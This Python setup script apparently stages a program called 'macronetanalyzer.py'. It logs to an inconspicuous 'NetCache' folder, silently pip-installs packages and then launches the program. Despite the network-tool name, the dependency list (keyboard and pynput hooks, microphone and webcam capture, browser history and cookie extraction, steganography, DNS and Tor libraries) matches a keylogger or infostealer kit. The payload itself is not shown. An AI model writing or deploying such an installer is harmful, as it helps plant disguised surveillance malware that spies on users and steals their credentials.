import os
import sys
import subprocess
import platform
import logging
from pathlib import Path

# ---------- Logging directory (Windows: support both NetCache and .netcache) ----------
if platform.system() == "Windows":
    base = os.environ.get("APPDATA", str(Path.home()))
    netcache = Path(base) / "NetCache"
    dot_netcache = Path(base) / ".netcache"
    # create both to be safe (older scripts may use .netcache)
    netcache.mkdir(parents=True, exist_ok=True)
    dot_netcache.mkdir(parents=True, exist_ok=True)
    log_dir = netcache  # prefer NetCache for logging
else:
    log_dir = Path.home() / ".netcache"
    log_dir.mkdir(parents=True, exist_ok=True)

log_file = log_dir / "netsetup.log"
logging.basicConfig(
    filename=str(log_file),
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logging.info("Starting setup process...")

PY = sys.executable  # the exact python running this script


def _run(cmd, check=True):
    """Run a command and log stdout/stderr to our log file."""
    logging.info("EXEC: %s", " ".join(cmd))
    result = subprocess.run(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    if result.stdout:
        logging.info(result.stdout.strip())
    if check and result.returncode != 0:
        logging.error("Command failed (%s): %s", result.returncode, " ".join(cmd))
        raise subprocess.CalledProcessError(result.returncode, cmd)
    return result.returncode


def ensure_pip():
    """Make sure pip exists & is usable for this interpreter."""
    try:
        _run([PY, "-m", "pip", "--version"], check=False)
    except Exception:
        pass
    # ensurepip may be a no-op if pip already installed
    try:
        _run([PY, "-m", "ensurepip", "--upgrade"], check=False)
    except Exception:
        logging.info("ensurepip not available; continuing.")
    # upgrade pip (best effort)
    _run([PY, "-m", "pip", "install", "--upgrade", "pip"], check=False)


def install_dependencies():
    """Install required & optional packages with this interpreter."""
    required = [
        "keyboard",
        "pynput",
        "requests",
        "pillow",
        "psutil",
        "sounddevice",
        "wavio",
        "opencv-python",
        "browser-history",
        "stegano",
        "dnspython",
    ]
    optional = ["scapy", "browser_cookie3", "torpy"]

    # On Windows, add pywin32
    if platform.system() == "Windows":
        required.append("pywin32")

    for pkg in required:
        try:
            __import__(pkg.replace("-", "_"))
            logging.info("Requirement already satisfied: %s", pkg)
        except Exception:
            logging.info("Installing required package: %s", pkg)
            rc = _run([PY, "-m", "pip", "install", "-q", pkg], check=False)
            if rc != 0:
                logging.error("Failed to install required package: %s", pkg)

    for pkg in optional:
        try:
            __import__(pkg.replace("-", "_"))
            logging.info("Optional already satisfied: %s", pkg)
        except Exception:
            logging.info("Installing optional package: %s", pkg)
            _run([PY, "-m", "pip", "install", "-q", pkg], check=False)


def run_macronetanalyzer():
    """Run macronetanalyzer.py from the same directory as this setup script."""
    repo_root = Path(__file__).resolve().parent
    target = repo_root / "macronetanalyzer.py"
    if not target.exists():
        logging.error("macronetanalyzer.py not found at: %s", target)
        sys.exit(1)
    rc = _run([PY, str(target)], check=False)
    if rc != 0:
        logging.error("macronetanalyzer exited with code %s", rc)
        sys.exit(rc)


if __name__ == "__main__":
    try:
        ensure_pip()
        install_dependencies()
        logging.info("Dependencies handled; running macronetanalyzer...")
        run_macronetanalyzer()
    except Exception as e:
        logging.exception("Setup failed: %s", e)
        sys.exit(1)
